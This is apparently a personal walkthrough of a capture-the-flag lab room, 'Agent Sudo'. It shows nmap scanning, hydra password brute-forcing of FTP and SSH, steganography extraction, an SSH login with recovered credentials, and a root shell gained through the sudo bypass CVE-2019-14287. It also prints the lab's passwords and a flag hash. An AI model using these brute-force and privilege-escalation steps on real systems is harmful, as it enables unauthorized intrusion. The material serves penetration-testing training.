Agent Sudo 
Welcome to another THM exclusive CTF room. Your task is simple, 
capture the flags just like the other CTF room. Have Fun!

1. enumerate
nmap -v -Pn -sV <ip>
found 3 ports 21, 80, 22

2. try looking at the website since port 80 is open
- also look at source code, found user name and redirect info

3. try to redirect to a secret page using "User_Agent"

4. What is Agent's name
- chris

5. try accesing ftp with Agent's name
- ftp 10.10.248.188
use "get" to download a single file or "mget *" to download all files

6. use hydra to bruteforce ftp
- hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<ip>
- hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://<ip>
- found ftp PW - [21][ftp] host: 10.10.248.188   login: chris   password: crystal

7. do ls for a listing of files
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
analyze images and text with strings, xxd, binwalk
- binwalk -e cutie.png
found cutie.png to be a zip file
created dir for cutie.png w/ extracted files
cd _cutie.png.extracted/
_cutie.png.extracted$ ls
total 316
-rw-r--r-- 1 phos phos 279312 Jun 11 14:25 365
-rw-r--r-- 1 phos phos  33973 Jun 11 14:25 365.zlib
-rw-r--r-- 1 phos phos    280 Jun 11 14:25 8702.zip
-rw-r--r-- 1 phos phos      0 Oct 29  2019 To_agentR.txt

The 8702.zip looks interesting, unzip that
- unzip 8702.zip
- cannot unzip, use JohnThe Ripper (goodluck, is a pain to use it)
- try zip2john 8702.zip
The To_agentR.txt has a code or name "QXJlYTUx"
to read message 
-cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

From researching it is base64 encoded
- echo QXJlYTUx | base64
and you get "UVhKbFlUVXgK" decodes to "Area51" a password
use this to access the 8702.zip file w/passwd Area51

8. to get steg password from fake picture with password
- steghide extract-sf cute-alien.jpg, passphrase is "Area51"
you'll get a message.txt, cat it
- cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

9. try ssh'ing with james@10.10.38.88
user james, password hackerrules! IT WORKED
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
- cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
cannot use get to download the Alien_autopsy.jpg file, presume because we ssh'd ?
try scp to download because we ssh'd in the system
-scp james@10.10.243.145:/home/james/Alien_autospy.jpg . 

10. What is the incident of the photo called?
In this case the hint states to reverse the image and Fox News is a clue
answer is Roswell Alien Autopsy

11. CVE number for the escalation 
use linpeas to discover vulns by scp'into jame's system
- scp /usr/bin/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh james@10.10.243.145:/dev/shm
james@10.10.243.145's password: 
linpeas.sh                                                                      100%  221KB 485.5KB/s   00:00
move into james's dir and make linpeas executable to run.
james@agent-sudo:$ /dev/shm ( /dev/shm is nothing but implementation of traditional shared memory concept. 
it an efficient means of passing data between programs(temp file storage)
linpeas should be there and chmod +x linpeash.sh
- ./linpeas.sh
no apparent password but it is pointed out in the John Hammond video
sudo -l may be the vuln
- sudo -l
[sudo] password for james:

CVE-2019-14287 sudo Vulnerability Allows Bypass of User Restrictions
https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability
The sudo vulnerability CVE-2019-14287 is a security policy bypass issue that provides a user or a program the ability 
to execute commands as root on a Linux system when the "sudoers configuration" explicitly disallows the root access. 
Exploiting the vulnerability requires the user to have sudo privileges that allow them to run commands with an arbitrary 
user ID, except root. The function which converts user id into its username incorrectly treats -1,or its unsigned 
equivalent 4294967295, like 0, which is always the user ID of root user. 

12. to get flag use vuln to run as sudo
- $ sudo -u#-1 /bin/bash
root@agent-sudo:~# 
- cd /root
root.txt
cat root.txt
